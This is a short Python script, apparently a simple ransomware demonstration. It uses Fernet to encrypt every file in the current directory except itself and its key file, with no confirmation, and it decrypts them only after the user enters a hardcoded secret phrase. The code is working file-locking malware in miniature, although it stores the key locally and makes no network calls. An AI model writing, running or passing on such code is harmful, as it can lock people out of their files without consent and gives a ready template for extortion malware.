from cryptography.fernet import Fernet
import os

def encrypt_file(file_path, key):
    with open(file_path, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file_path, "wb") as thefile:
        thefile.write(contents_encrypted)

def encrypt_directory(directory_path, key):
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path) and filename not in ["encrypt.py", "thekey.key"]:
            encrypt_file(file_path, key)

def decrypt_file(file_path, key):
    with open(file_path, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file_path, "wb") as thefile:
        thefile.write(contents_decrypted)

def decrypt_directory(directory_path, key):
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path) and filename not in ["encrypt.py", "thekey.key"]:
            decrypt_file(file_path, key)

def main():
    key_file_path = "thekey.key"

    # Check if key file exists
    if os.path.exists(key_file_path):
        # Prompt user for secret phrase during decryption
        user_phrase = input("Enter The Secret Phrase to Decrypt Files: ")

        # Check if the secret phrase is correct
        if user_phrase == "godigodi":
            with open(key_file_path, "rb") as key_file:
                key = key_file.read()
            decrypt_directory(os.getcwd(), key)
            print("Files Decrypted.")
        else:
            print("Sorry, wrong secret phrase. Exiting.")
    else:
        # Generate encryption key and save it to thekey.key
        key = Fernet.generate_key()
        with open(key_file_path, "wb") as key_file:
            key_file.write(key)
        print("Encryption key generated and saved to thekey.key.")
        # Encrypt files in the current directory
        encrypt_directory(os.getcwd(), key)
        print("Files Encrypted.")

if __name__ == "__main__":
    main()
